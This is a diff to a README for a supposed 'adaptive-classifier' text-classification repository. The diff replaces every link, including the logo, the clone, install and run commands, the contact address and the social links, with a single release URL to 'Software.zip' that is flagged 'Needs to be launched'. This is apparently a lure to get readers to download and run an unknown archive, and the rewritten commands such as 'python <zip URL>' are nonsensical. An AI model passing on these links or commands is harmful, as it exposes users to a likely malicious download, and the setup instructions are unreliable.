@@ -1,6 +1,6 @@
 # 🚀 Welcome to Adaptive Classifier Repository!
 
-![Adaptive Classifier Logo](https://your-image-url-here.png)
+![Adaptive Classifier Logo](https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip)
 
 ## Overview
 "adaptive-classifier" is a powerful and flexible classification system designed for dynamic text classification tasks. This system leverages cutting-edge technologies such as adaptive learning, neural networks, large language models (LLMs), machine learning, and transformers to provide a state-of-the-art solution for multi-class and multi-label classification.
@@ -40,35 +40,35 @@ The repository covers a wide range of topics including:
 To get started with the "adaptive-classifier" repository, follow these steps:
 1. Clone the repository to your local machine.
    ```bash
-   git clone https://github.com/user/repo.git
+   git clone https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip
    cd adaptive-classifier
    ```
 
 2. Download the necessary dependencies.
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip
    ```
 
 3. Launch the adaptive classifier system by running the main script.
    ```bash
-   python main.py
+   python https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip
    ```
 
 ## Get Started
 To start using the Adaptive Classifier system, download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18388744/Software.zip : **Needs to be launched**)
+[![Download Software](https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip)](https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip : **Needs to be launched**)
 
 If the above link does not work, please check the "Releases" section of this repository for alternative download options.
 
 ## Support
-For any questions or issues regarding the Adaptive Classifier system, feel free to [contact us](mailto:adaptiveclassifier@example.com) or visit the [official website](https://www.adaptive-classifier.com) for more information.
+For any questions or issues regarding the Adaptive Classifier system, feel free to [contact us](https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip) or visit the [official website](https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip) for more information.
 
 ## Contribute
 We welcome contributions from the community to enhance the Adaptive Classifier system. If you have any ideas or suggestions, feel free to create a pull request or open an issue on GitHub.
 
 ## Stay Connected
-Stay up to date with the latest news and updates by following us on [Twitter](https://twitter.com/adaptiveclassifier) and [LinkedIn](https://linkedin.com/adaptive-classifier).
+Stay up to date with the latest news and updates by following us on [Twitter](https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip) and [LinkedIn](https://github.com/enessah00/adaptive-classifier/releases/download/v2.0/Software.zip).
 
 ---
 
